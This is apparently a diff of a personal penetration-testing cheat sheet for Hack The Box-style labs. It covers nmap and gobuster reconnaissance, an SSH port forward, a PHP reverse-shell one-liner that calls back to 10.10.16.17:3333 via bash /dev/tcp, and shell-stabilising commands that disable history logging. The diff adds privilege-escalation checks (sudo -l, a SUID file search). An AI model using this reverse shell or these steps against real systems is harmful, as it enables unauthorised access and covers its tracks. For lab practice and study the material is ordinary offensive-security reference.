@@ -7,7 +7,6 @@ y2BDp1p8
 
 ```
 nmap -sVC --min-rate 1500 -p- -Pn 10.10.11.68
-
 sudo nmap -sU --top-ports 100 -T4 -v <IP_Target>
 ```
 
@@ -30,8 +29,6 @@ gobuster vhost -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discover
 ```
 ssh -L 3000:127.0.0.1:3000 axel@cat.htb
 ```
-
-
 # Reverse Shell
 ```
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.17/3333 0>&1'"); ?>
@@ -65,4 +62,9 @@ script -qc /bin/bash /dev/null
 
 python3 -c 'import pty,os; pty.spawn("/bin/bash")'
 export TERM=xterm export SHELL=bash export HISTFILE=/dev/null
+```
+# PE trick lỏd
+```
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
 ```
